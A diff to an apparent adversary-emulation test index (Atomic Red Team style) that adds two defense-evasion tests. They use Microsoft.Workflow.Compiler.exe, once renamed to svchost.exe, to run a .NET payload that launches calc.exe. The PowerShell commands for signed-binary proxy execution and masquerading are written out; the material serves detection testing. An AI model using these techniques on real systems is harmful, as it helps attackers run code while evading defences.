@@ -38851,6 +38851,69 @@ defense-evasion:
         command: '"#{microsoft_wordpath}\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
 
 '
+    - name: Microsoft.Workflow.Compiler.exe Payload Execution
+      auto_generated_guid: 7cbb0f26-a4c1-4f77-b180-a009aa05637e
+      description: 'Emulates attack with Microsoft.Workflow.Compiler.exe running a
+        .Net assembly that launches calc.exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        xml_payload:
+          description: XML to execution
+          type: path
+          default: PathToAtomicsFolder\T1218\src\T1218.xml
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ".Net must be installed for this test to work correctly.\n"
+        prereq_command: 'if (Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
+          ) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'write-host ".Net must be installed for this test to work
+          correctly."
+
+'
+      executor:
+        command: |
+          Set-Location -path PathToAtomicsFolder\T1218\src ;
+          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe "#{xml_payload}" output.txt
+        name: powershell
+        elevation_required: false
+    - name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions
+      auto_generated_guid: 4cc40fd7-87b8-4b16-b2d7-57534b86b911
+      description: 'Emulates attack with a renamed Microsoft.Workflow.Compiler.exe
+        running a .Net assembly that launches calc.exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        xml_payload:
+          description: XML to execution
+          type: path
+          default: PathToAtomicsFolder\T1218\src\T1218.xml
+        renamed_binary:
+          description: renamed Microsoft.Workflow.Compiler
+          type: path
+          default: PathToAtomicsFolder\T1218\src\svchost.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ".Net must be installed for this test to work correctly.\n"
+        prereq_command: |
+          Copy-Item C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe "#{renamed_binary}" -Force
+          if (Test-Path "#{renamed_binary}") {exit 0} else {exit 1}
+        get_prereq_command: 'write-host "you need to rename workflow complier before
+          you run this test"
+
+'
+      executor:
+        command: |
+          Set-Location -path PathToAtomicsFolder\T1218\src ;
+          #{renamed_binary} #{xml_payload} output.txt
+        name: powershell
+        elevation_required: false
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
